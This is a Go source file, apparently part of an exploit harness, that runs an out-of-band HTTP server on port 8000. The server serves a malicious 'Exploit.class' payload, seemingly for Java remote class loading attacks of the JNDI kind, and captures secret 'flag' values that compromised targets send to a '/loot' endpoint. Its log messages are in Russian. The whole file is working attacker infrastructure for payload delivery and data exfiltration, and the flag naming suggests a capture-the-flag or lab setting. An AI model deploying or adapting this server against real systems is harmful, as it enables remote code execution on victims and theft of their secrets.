package oob

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"sync"
)

var (
	statusMu         sync.RWMutex
	callbackReceived bool
	exfiltratedFlag  string
	httpServer       *http.Server
)

// ResetCallback clears the OOB state
func ResetCallback() {
	statusMu.Lock()
	defer statusMu.Unlock()
	callbackReceived = false
	exfiltratedFlag = ""
}

// RegisterCallback registers a successful callback payload
func RegisterCallback(flag string) {
	statusMu.Lock()
	defer statusMu.Unlock()
	callbackReceived = true
	exfiltratedFlag = flag
}

// GetCallbackStatus returns whether a callback was received and the exfiltrated loot
func GetCallbackStatus() (bool, string) {
	statusMu.RLock()
	defer statusMu.RUnlock()
	return callbackReceived, exfiltratedFlag
}

// StartHTTPServer starts the HTTP server on port :8000 to serve Exploit.class and receive loot
func StartHTTPServer() {
	mux := http.NewServeMux()

	// Serve Exploit.class from various fallback locations
	mux.HandleFunc("/Exploit.class", func(w http.ResponseWriter, r *http.Request) {
		fmt.Println("[HTTP SERVER] Получен запрос на загрузку Exploit.class")
		paths := []string{
			"Exploit.class",
			"internal/payload/Exploit.class",
			"/app/Exploit.class",
		}
		var data []byte
		var err error
		for _, p := range paths {
			data, err = ioutil.ReadFile(p)
			if err == nil {
				break
			}
		}
		if err != nil {
			w.WriteHeader(http.StatusNotFound)
			return
		}
		w.Header().Set("Content-Type", "application/octet-stream")
		w.WriteHeader(http.StatusOK)
		w.Write(data)
	})

	// Capture exfiltrated loot
	mux.HandleFunc("/loot", func(w http.ResponseWriter, r *http.Request) {
		flag := r.URL.Query().Get("flag")
		if flag != "" {
			fmt.Printf("[HTTP SERVER] >>> ПЕРЕХВАЧЕН СЕКРЕТНЫЙ ФЛАГ: %s <<<\n", flag)
			RegisterCallback(flag)
		}
		w.WriteHeader(http.StatusOK)
	})

	httpServer = &http.Server{
		Addr:    ":8000",
		Handler: mux,
	}

	go func() {
		if err := httpServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			fmt.Printf("[HTTP SERVER] Ошибка запуска: %v\n", err)
		}
	}()
}

// StopHTTPServer stops the HTTP server
func StopHTTPServer() {
	if httpServer != nil {
		_ = httpServer.Close()
	}
}
